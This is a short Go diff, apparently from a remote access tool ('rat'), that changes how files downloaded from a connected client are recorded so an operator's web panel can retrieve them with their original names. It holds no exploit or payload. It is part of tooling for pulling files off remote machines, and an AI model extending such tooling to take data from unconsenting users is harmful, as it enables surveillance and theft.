@@ -6,6 +6,8 @@ import (
 	"rat/command/utils"
 	"rat/common"
 
+	"path/filepath"
+
 	"golang.org/x/net/websocket"
 )
 
@@ -69,7 +71,10 @@ func (packet DownloadPacket) Read(c *Client) error {
 
 		// Set temp file mapping so that we can download it from the web panel
 		tempKey := utils.Sha256(file)
-		TempFiles[tempKey] = transfer.Local.Name()
+		TempFiles[tempKey] = TempFile{
+			Path: transfer.Local.Name(),
+			Name: filepath.Base(file),
+		}
 
 		if ws, ok := c.Listeners[common.GetFileHeader]; ok {
 			event := newEvent(DownloadQueryEvent, c.Id, tempKey)
